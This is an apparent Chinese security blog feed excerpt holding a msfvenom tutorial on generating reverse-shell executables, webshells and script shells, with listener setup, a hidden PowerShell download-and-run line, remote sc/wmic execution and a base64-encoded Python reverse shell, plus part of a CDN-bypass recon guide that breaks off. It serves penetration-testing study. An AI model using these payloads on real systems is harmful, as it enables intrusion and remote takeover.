      <category term="提权" scheme="https://shu1l.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>msf反弹payload学习</title>
    <link href="https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi/</id>
    <published>2020-04-27T05:30:20.000Z</published>
    <updated>2020-05-17T11:27:34.605Z</updated>
    
    <content type="html"><![CDATA[<h2 id="学习msfvenom生成反弹payload总结"><a href="#学习msfvenom生成反弹payload总结" class="headerlink" title="学习msfvenom生成反弹payload总结"></a>学习msfvenom生成反弹payload总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code>我们知道目前来说流行的shell主要有两种，一种是正向shell(bind_shell)一种是反向shell(reverse_shell)</code></pre><p><strong>正向shell</strong>:攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。(攻击者-&gt;被攻击者)</p><p><strong>反向shell:</strong>被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。(攻击者&lt;-被攻击者)</p><p><strong>nc</strong>可以实现一个很简单的正向与反向shell连接的示例：</p><p>正向</p><p><img src="1208761-20190108155228561-656308830.png" alt=""></p><p>反向</p><p><img src="1208761-20190108140558839-392665606.png" alt=""></p><p>对于实际的渗透测试过程来说，我们常常使用的往往是反弹shell的方式来突破边界防火墙的限制。</p><p><strong>下面列举了一些使用反向shell的情况：</strong></p><ul><li>目标机器在一个不同（相对攻击者而言）的私有网络</li><li>目标机器的防火墙阻挡了所有入口连接（这种情况正向 Shell 是会被防火墙阻挡的）.</li><li>由于一些原因，你的 Payload 不能绑定在应该绑定的端口的时候</li><li>你还不能确定应该选择反向 Shell 还是正向 Shell 的时候</li></ul><h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>​        msfvenom是msfpayload,msfencode的结合体，可利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线。Msfvenom 在 2015 年 6 月 8 日已经替代了 msfpayload 与 msfenocde 命令，它是这两个命令的结合体。为了开始使用 msfvenom，可以首先浏览一下它所支持的命令参数：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427142626.png" alt=""></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Options:</span><br><span class="line">    -p, <span class="comment">--payload       &lt;payload&gt;    Payload to use. Specify a '-' or stdin to use custom payloads # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取</span></span><br><span class="line">        <span class="comment">--payload-options            List the payload's standard options # 列出指定 Payload 的标准可选配置项</span></span><br><span class="line">    -l, <span class="comment">--list          [type]       List a module type. Options are: payloads, encoders, nops, all # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, all</span></span><br><span class="line">    -n, <span class="comment">--nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload # 指定 nop 在 payload 中的数量（译者注：类似堆喷射中通过 nop 滑动到 payload）</span></span><br><span class="line">    -f, <span class="comment">--format        &lt;format&gt;     Output format (use --help-formats for a list) # 指定 Payload 的输出格式</span></span><br><span class="line">        <span class="comment">--help-formats               List available formats # 列出所有可用的输出格式</span></span><br><span class="line">    -e, <span class="comment">--encoder       &lt;encoder&gt;    The encoder to use # 指定使用的 Encoder</span></span><br><span class="line">    -a, <span class="comment">--arch          &lt;arch&gt;       The architecture to use # 指定目标系统架构</span></span><br><span class="line">        <span class="comment">--platform      &lt;platform&gt;   The platform of the payload # 指定目标系统平台</span></span><br><span class="line">        <span class="comment">--help-platforms             List available platforms # 列出可用的平台</span></span><br><span class="line">    -s, <span class="comment">--space         &lt;length&gt;     The maximum size of the resulting payload # 设置未经编码的 Payload 的最大长度</span></span><br><span class="line">        <span class="comment">--encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value) # 编码后的 Payload 的最大长度</span></span><br><span class="line">    -b, <span class="comment">--bad-chars     &lt;list&gt;       The list of characters to avoid example: '\x00\xff' # 设置需要在 Payload 中避免出现的字符</span></span><br><span class="line">    -i, <span class="comment">--iterations    &lt;count&gt;      The number of times to encode the payload # 设置 Payload 的编码次数</span></span><br><span class="line">    -c, <span class="comment">--add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include # 指定包含一个额外的win32 shellcode文件</span></span><br><span class="line">    -x, <span class="comment">--template      &lt;path&gt;       Specify a custom executable file to use as a template # 指定一个特定的可执行文件作为模板</span></span><br><span class="line">    -k, <span class="comment">--keep                       Preserve the template behavior and inject the payload as a new thread # 保护模板程序的功能，注入的payload作为一个新的进程运行</span></span><br><span class="line">    -o, <span class="comment">--out           &lt;path&gt;       Save the payload # 保存 Payload 到文件</span></span><br><span class="line">    -v, <span class="comment">--var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats # 指定一个变量名</span></span><br><span class="line">（译者注：当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）</span><br><span class="line">        <span class="comment">--smallest                   Generate the smallest possible payload # 尽可能生成最短的 Payload</span></span><br><span class="line">    -h, <span class="comment">--help                       Show this message # 帮助</span></span><br></pre></td></tr></table></figure><p>我们可以通过命令列出可用的payloads、encoders、nops。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom <span class="comment">--list payloads</span></span><br><span class="line">msfvenom <span class="comment">--list encoders</span></span><br><span class="line">msfvenom <span class="comment">--list nops</span></span><br></pre></td></tr></table></figure><p>下面我们使用msf生成一些可用的反弹shell的paylaod。</p><h4 id="生成二进制文件"><a href="#生成二进制文件" class="headerlink" title="生成二进制文件"></a>生成二进制文件</h4><p>关于二进制文件，主要介绍适用于Windows、linux、mac操作系统的payload生成与利用。</p><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt; <span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt; <span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><h5 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt;<span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure><h5 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h5><p>针对这个部分就以Windows为例，使用上面的命令生成一个exe的payload，命令如下：</p><p>攻击机:kali  192.168.153.176</p><p>靶机: win7   192.168.153.160</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span> LPORT=<span class="number">5555</span> -f exe -o payload.exe</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200427153433.png" alt=""></p><p>复制shell.exe到Windows机器，然后kali下开启msf使用如下命令监听4444端口：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfconsole    <span class="comment">//启动msf</span></span><br><span class="line"></span><br><span class="line">use exploit/multi/handler          <span class="comment">//使用msf的侦听模块exploit/multi/handler</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> PAYLOAD <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span>        //设置载荷<span class="comment">payload</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 192.168.153.176</span>               //设置本地监听机<span class="comment">Ip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT  4444</span>              //设置监听端口</span><br><span class="line">     </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>执行完之后在Windows下执行payload.exe，然后结果如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427153539.png" alt=""></p><p>在这里既然使用到了在Windows下执行应用程序，我们就大概盘点一下在Windows执行应用程序的几种方式：</p><ul><li>双击运行</li><li>cmd下运行exe</li><li>利用Powershell远程下载执行</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (<span class="built_in">new</span>-<span class="keyword">object</span> <span class="keyword">system</span>.net.webclient).downloadfile(<span class="string">'http://127.0.0.1:8089'</span>,<span class="string">'shell.exe'</span>);</span><br><span class="line"><span class="keyword">start</span>-process shell.exe</span><br></pre></td></tr></table></figure><ul><li>利用at或schtasks设置计划任务执行</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net use \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span>\c$ <span class="string">"admin123"</span> /user:pt007</span><br><span class="line">net use</span><br><span class="line">dir \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span>\c$</span><br><span class="line">copy test.exe \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span>\c$</span><br><span class="line">sc \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span> create test binpath= <span class="string">"c:\test.exe"</span></span><br><span class="line">sc \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span> start test</span><br><span class="line">sc \\<span class="number">192.168</span><span class="number">.17</span><span class="number">.138</span> del test</span><br></pre></td></tr></table></figure><ul><li>利用wmic远程命令执行</li></ul><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /<span class="keyword">node</span><span class="title">:192</span>.<span class="number">168.1</span>.<span class="number">158</span> /user:pt007 /password:admin123  process call create <span class="string">"cmd.exe /c ipconfig&gt;d:\result.txt"</span></span><br></pre></td></tr></table></figure><h4 id="生成webshell脚本"><a href="#生成webshell脚本" class="headerlink" title="生成webshell脚本"></a><strong>生成webshell脚本</strong></h4><p>​    在做web渗透的时候，经常会用到webshell，我们经常用的一句话用菜刀连接，这里介绍下如何使用msfvenom生成webshell。</p><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp <span class="attribute">LHOST</span>=&lt;Your<span class="built_in"> IP </span>Address&gt; <span class="attribute">LPORT</span>=&lt;Your<span class="built_in"> Port </span><span class="keyword">to</span> Connect On&gt; -f<span class="built_in"> raw </span>&gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo <span class="string">'&lt;?php '</span> | tr -d <span class="string">'\n'</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><h5 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><h5 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure><h5 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure><h4 id="如何利用-1"><a href="#如何利用-1" class="headerlink" title="如何利用"></a>如何利用</h4><p>下面以php为例做一下测试，使用以下命令生成一个webshell：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.88</span><span class="number">.128</span> LPORT=<span class="number">4444</span> -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200427151118.png" alt=""></p><p>在kali上使用msf执行下面的命令，监听端口4444：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">    </span><br><span class="line">use exploit/multi/handler </span><br><span class="line">    </span><br><span class="line">set PAYLOAD php/meterpreter_reverse_tcp </span><br><span class="line">    </span><br><span class="line">set LHOST <span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span></span><br><span class="line">    </span><br><span class="line">set LPORT  <span class="number">4444</span> </span><br><span class="line">    </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200427152102.png" alt=""></p><h4 id="脚本shell"><a href="#脚本shell" class="headerlink" title="脚本shell"></a>脚本shell</h4><p>关于使用脚本反弹shell的方式，主要以python、bash、perl为例。</p><p>这种反弹方式也叫做<strong>git解释性脚本语言反弹shell</strong></p><h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><h5 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure><h5 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h5 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h5><p>下面就以Python为例做一下测试，使用以下命令生成一个脚本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=<span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span> LPORT=<span class="number">4444</span> -f raw &gt; shell.py</span><br></pre></td></tr></table></figure><p>在kali上使用msf执行下面的命令，监听端口4444：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">    </span><br><span class="line">use exploit/multi/handler </span><br><span class="line">    </span><br><span class="line">set PAYLOAD cmd/unix/reverse_python </span><br><span class="line">    </span><br><span class="line">set LHOST <span class="number">192.168</span><span class="number">.153</span><span class="number">.176</span> set LPORT  <span class="number">4444</span> </span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>然后复制shell.py中的内容在linux命令行下执行，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ=='.decode('base64'))"</span></span><br></pre></td></tr></table></figure><p><img src="QQ%E6%88%AA%E5%9B%BE20200427150606.png" alt=""></p><p>结果如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427150633.png" alt=""></p><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/2380" target="_blank" rel="noopener">https://xz.aliyun.com/t/2380</a></p><p><a href="https://blog.51cto.com/13539934/2113551" target="_blank" rel="noopener">https://blog.51cto.com/13539934/2113551</a></p><p>[<a href="https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]" target="_blank" rel="noopener">https://www.sariel.top/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/#o-%E6%96%87%E4%BB%B6%E8%BE%93%E5%87%BA]</a>(</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;学习msfvenom生成反弹payload总结&quot;&gt;&lt;a href=&quot;#学习msfvenom生成反弹payload总结&quot; class=&quot;headerlink&quot; title=&quot;学习msfvenom生成反弹payload总结&quot;&gt;&lt;/a&gt;学习msfvenom生成反弹pay
      
    
    </summary>
    
    
      <category term="渗透测试学习" scheme="https://shu1l.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="msf" scheme="https://shu1l.github.io/tags/msf/"/>
    
  </entry>
  
  <entry>
    <title>绕过CDN查找ip方法总结</title>
    <link href="https://shu1l.github.io/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/"/>
    <id>https://shu1l.github.io/2020/04/27/rao-guo-cdn-cha-zhao-ip-fang-fa-zong-jie/</id>
    <published>2020-04-27T02:54:39.000Z</published>
    <updated>2020-04-27T11:40:27.140Z</updated>
    
    <content type="html"><![CDATA[<h2 id="绕过CDN查找真实IP方法总结"><a href="#绕过CDN查找真实IP方法总结" class="headerlink" title="绕过CDN查找真实IP方法总结"></a>绕过CDN查找真实IP方法总结</h2><h4 id="什么是CDN以及CDN加速？"><a href="#什么是CDN以及CDN加速？" class="headerlink" title="什么是CDN以及CDN加速？"></a>什么是CDN以及CDN加速？</h4><p><strong>(摘自百度百科）</strong></p><p>​        CDN的全称是Content Delivery Network，即<a href="https://baike.baidu.com/item/内容分发网络/4034265" target="_blank" rel="noopener">内容分发网络</a>。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p><p><img src="4610b912c8fcc3ce005c05d19c45d688d53f20b0%5B1%5D.png" alt=""></p><p>比较常见的基于公有云的高可用架构，即：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">域名</span>--&gt;<span class="comment">CDN，CDN</span>--&gt;<span class="comment">WAF，WAF</span>--&gt;<span class="comment">SLB，SLB</span>--&gt;<span class="comment">ECS</span></span><br></pre></td></tr></table></figure><p><strong>CDN对网站有什么好处?</strong></p><p>​    首先，开启CDN后的网站，会根据用户所在地的不同访问CDN的节点服务器，并不直接访问源服务器，这样可以减少网站服务器宽带资源,降低服务器压力。这也就是大家都在ping百度,但是不同地区得到的反馈ip不一样的原因。</p><p>​    其次，由于CDN节点的阻挡防护，可以更好的保护员服务器的安全。具体来说，CDN其实是充当了一个替身的角色，无论服务器是渗透还是DD0S攻击，攻击的目标都将是CDN节点，这样一来便间接的保护了网站本身。</p><p><strong>为什么我们需要绕过CDN？</strong></p><pre><code>对于我们渗透测试者来说，我们在信息收集中重要的一步就是要得到目标服务器主机的**真实IP地址**，但如果目标服务器部署了CDN服务，那么往往我们直接访问得到的IP只是CDN节点服务器的IP，而不是真实的源服务器的IP地址，这是就需要我们想办法绕过CDN获取源服务器IP。</code></pre><p>下面我收集了一些常见的绕过CDN的方法，留作记录:</p><h4 id="验证是否存在CDN"><a href="#验证是否存在CDN" class="headerlink" title="验证是否存在CDN"></a>验证是否存在CDN</h4><h5 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h5><p>很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br> <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a><br> <a href="http://ping.aizhan.com/" target="_blank" rel="noopener">http://ping.aizhan.com/</a><br> <a href="http://ce.cloud.360.cn/" target="_blank" rel="noopener">http://ce.cloud.360.cn/</a></p><p>我们这里打开第一个网站：ping一下<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427093341.png" alt=""></p><p>这里可以看出百度的独立IP有17个，且各个节点的返回速度存在不同的延迟。说明百度采用了CDN服务，但是ping没有办法确认真实IP。</p><h5 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h5><p>使用 nslookup 进行检测，原理同上，如果返回域名解析对应多个 IP 地址多半是使用了 CDN。有 CDN 的示例：</p><blockquote><p> <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a><br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p><p> 非权威应答:<br> 名称:    163.xdwscache.ourglb0.com<br> Addresses:  58.223.164.86</p><p> ​          125.75.32.252<br> Aliases:  <a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com</a></p><p> ​          <a href="http://www.163.com.lxdns.com/" target="_blank" rel="noopener">www.163.com.lxdns.com</a></p></blockquote><p>无 CDN 的示例：</p><blockquote><p> xiaix.me<br> 服务器:  public1.114dns.com<br> Address:  114.114.114.114</p><p> 非权威应答:<br> 名称:    xiaix.me<br> Address:  192.3.168.172  </p></blockquote><p>下面我收集了一些常见的绕过CDN查找真实IP的方法，留作记录:</p><h4 id="绕过-CDN-查找网站真实-IP"><a href="#绕过-CDN-查找网站真实-IP" class="headerlink" title="绕过 CDN 查找网站真实 IP"></a>绕过 CDN 查找网站真实 IP</h4><h5 id="1-查询历史DNS记录"><a href="#1-查询历史DNS记录" class="headerlink" title="1:查询历史DNS记录"></a>1:查询历史DNS记录</h5><p>1）查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br> <a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>     ###DNS查询<br> <a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>    ###微步在线<br> <a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=</a>    ###在线域名信息查询<br> <a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a>        ###DNS、IP等查询<br> <a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener">https://tools.ipip.net/cdn.php</a>  ###CDN查询IP</p><p>2）利用<a href="https://securitytrails.com/" target="_blank" rel="noopener">SecurityTrails</a>平台，攻击者就可以精准的找到真实原始IP。他们只需在搜索字段中输入网站域名，然后按Enter键即可，这时“历史数据”就可以在左侧的菜单中找到。</p><p>如何寻找隐藏在CloudFlare或TOR背后的真实原始IP</p><p><img src="1058583-20181009230838766-860479177%5B1%5D.png" alt=""></p><p>除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。</p><p><strong>MX记录</strong></p><p>邮件交换记录 (<strong>MX record</strong>)是域名系统（DNS）中的一种资源记录类型，用于指定负责处理发往收件人域名的邮件服务器</p><h5 id="2-查询子域名寻找真实IP"><a href="#2-查询子域名寻找真实IP" class="headerlink" title="2.查询子域名寻找真实IP"></a>2.查询子域名寻找真实IP</h5><p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。</p><p>下面介绍些常用的子域名查找的方法和工具：</p><p>1）微步在线(<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a>)</p><p>上文提到的微步在线功能强大，黑客只需输入要查找的域名(如baidu.com)，点击子域名选项就可以查找它的子域名了，但是免费用户每月只有5次免费查询机会。如图：</p><p><img src="1058583-20181009230922994-1826758810%5B1%5D.png" alt=""></p><p>2）Dnsdb查询法。(<a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a>)</p><p>黑客只需输入baidu.com type:A就能收集百度的子域名和ip了。如图：<br> <img src="QQ%E6%88%AA%E5%9B%BE20200427094630.png" alt=""></p><p>3）Google 搜索</p><p>Google site:baidu.com -www就能查看除www外的子域名，如图：</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200427095533.png" alt=""></p><p>4）各种子域名扫描器</p><p>这里，主要为大家推荐子域名挖掘机和lijiejie的subdomainbrute(<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a>)</p><p>子域名挖掘机仅需输入域名即可基于字典挖掘它的子域名，如图：</p><p><img src="1058583-20181009231018377-2070670991%5B1%5D.png" alt=""></p><p>Subdomainbrute以windows为例，黑客仅需打开cmd进入它所在的目录输入</p><p><code>Python subdomainbrute.py baidu.com --full</code></p><p>即可收集百度的子域名，如图：</p><p><img src="1058583-20181009231030794-1664451845%5B1%5D.png" alt=""></p><p>注：收集子域名后尝试以解析ip不在cdn上的ip解析主站，真实ip成功被获取到。</p><h5 id="3：网络空间引擎搜索法"><a href="#3：网络空间引擎搜索法" class="headerlink" title="3：网络空间引擎搜索法"></a>3：网络空间引擎搜索法</h5><p>常见的有以前的钟馗之眼，<a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a>，<a href="https://fofa.so/" target="_blank" 